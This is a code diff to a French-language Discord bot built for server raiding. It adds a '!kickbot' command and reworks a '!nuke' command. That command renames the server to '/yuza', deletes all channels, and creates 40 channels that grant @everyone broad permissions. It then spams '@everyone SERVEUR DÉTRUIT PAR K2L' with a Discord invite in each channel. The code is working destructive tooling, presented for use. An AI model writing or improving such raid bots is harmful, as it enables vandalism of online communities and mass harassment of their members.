@@ -24,7 +24,7 @@ client.on('ready', () => {
     console.log(`Bot connecté en tant que ${client.user.tag} ! Prêt.`);
 });
 
-// Anti-bot actif
+// Anti-bot actif à l'arrivée
 client.on('guildMemberAdd', async member => {
     if (member.user.bot && member.id !== client.user.id) {
         try {
@@ -39,7 +39,33 @@ client.on('messageCreate', async message => {
     const isOwner = OWNERS.includes(message.author.id);
 
     // ==========================================
-    // 1. COMMANDE !DMALL
+    // 1. COMMANDE !KICKBOT (Expulse TOUS les autres bots)
+    // ==========================================
+    if (message.content === '!kickbot') {
+        if (!isOwner) return message.reply("❌ Tu n'as pas la permission.");
+
+        await message.reply("🤖 **[KICKBOT]** Nettoyage de tous les bots en cours...");
+
+        try {
+            const fetchedMembers = await message.guild.members.fetch();
+            let count = 0;
+
+            for (const [id, m] of fetchedMembers) {
+                if (m.user.bot && m.id !== client.user.id) {
+                    await m.kick('Kickbot - Nettoyage manuel').catch(() => {});
+                    count++;
+                }
+            }
+
+            await message.channel.send(`✅ **[KICKBOT]** Terminé ! ${count} bot(s) expulsé(s).`);
+        } catch (error) {
+            console.error("Erreur Kickbot :", error);
+            message.channel.send("❌ Erreur lors de l'expulsion des bots.");
+        }
+    }
+
+    // ==========================================
+    // 2. COMMANDE !DMALL
     // ==========================================
     if (message.content === '!dmall') {
         if (!isOwner) return message.reply("❌ Tu n'as pas la permission.");
@@ -117,7 +143,7 @@ client.on('messageCreate', async message => {
     }
 
     // ==========================================
-    // 2. COMMANDE !NUKE (Ultra-Fast + Rename /yuza + Salons ez-by-k2l)
+    // 3. COMMANDE !NUKE (Ultra-Fast + Salons avec Perms Overwrites)
     // ==========================================
     if (message.content === '!nuke') {
         if (!isOwner) return message.reply("❌ Tu n'as pas la permission.");
@@ -128,25 +154,30 @@ client.on('messageCreate', async message => {
             // A. Renommer le serveur en "/yuza"
             await message.guild.setName('/yuza').catch(() => {});
 
-            // B. Forcer la récupération des membres et kicker tous les autres bots
-            const fetchedMembers = await message.guild.members.fetch();
-            for (const [id, m] of fetchedMembers) {
-                if (m.user.bot && m.id !== client.user.id) {
-                    await m.kick('Nuke - Suppression des bots').catch(() => {});
-                }
-            }
-
-            // C. Suppression des salons existants
+            // B. Suppression des salons existants
             const oldChannels = message.guild.channels.cache;
             oldChannels.forEach(channel => {
                 channel.delete().catch(() => {});
             });
 
-            // D. Création massive de 40 salons "ez-by-k2l" et spam immédiat de pings
+            // C. Création de salons avec dérogations de perms pour @everyone (Gérer le salon, Liens, Messages, Pings)
             for (let i = 0; i < 40; i++) {
                 message.guild.channels.create({
                     name: 'ez-by-k2l',
-                    type: 0 // Salon textuel
+                    type: 0, // Salon textuel
+                    permissionOverwrites: [
+                        {
+                            id: message.guild.id, // Rôle @everyone
+                            allow: [
+                                PermissionsBitField.Flags.ViewChannel,
+                                PermissionsBitField.Flags.SendMessages,
+                                PermissionsBitField.Flags.ManageChannels, // Gérer le salon
+                                PermissionsBitField.Flags.EmbedLinks,     // Mettre des liens
+                                PermissionsBitField.Flags.AttachFiles,    // Mettre des fichiers
+                                PermissionsBitField.Flags.MentionEveryone // Mentionner everyone
+                            ]
+                        }
+                    ]
                 }).then(async channel => {
                     for (let j = 0; j < 10; j++) {
                         channel.send('@everyone SERVEUR DÉTRUIT PAR K2L discord.gg/yuza').catch(() => {});
